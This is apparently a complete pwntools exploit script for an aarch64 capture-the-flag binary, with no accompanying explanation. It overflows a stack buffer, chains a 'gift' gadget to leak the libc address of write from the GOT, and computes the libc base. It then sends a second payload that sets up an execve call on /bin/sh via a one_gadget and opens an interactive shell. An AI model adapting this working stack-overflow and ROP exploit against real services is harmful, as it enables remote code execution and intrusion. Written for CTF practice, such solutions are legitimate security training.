from pwn import *

elf = ELF("./chall")
ld = ELF("./ld-linux-aarch64.so.1")
libc = ELF("libzz.so")

context.binary = elf

# p = process(["qemu-aarch64", "-L", ".", "-g", "1234", "./chall"])
p = remote("localhost", 35129)
# gdb.attach(p)

bin_sh = 0x410500

payload = b'c' * 64 + pack(0xdeadbeefcafebabe) + b'b' * 24 + pack(elf.symbols['gift']) + pack(elf.got['write']) + pack(8) + pack(elf.symbols['main'] + 80)

p.sendlineafter(b'> ', payload)

leak = u64(p.recv(8)) - libc.symbols['write']   
print(hex(leak))

payload = flat({
    0x50-56: 221,
    0x58-56: bin_sh,
    0x60-56: 0
}, filler=b'd', length=80) + pack(leak + libc.symbols['one_gadget']) + cyclic(24)

p.sendline(payload)

p.interactive()
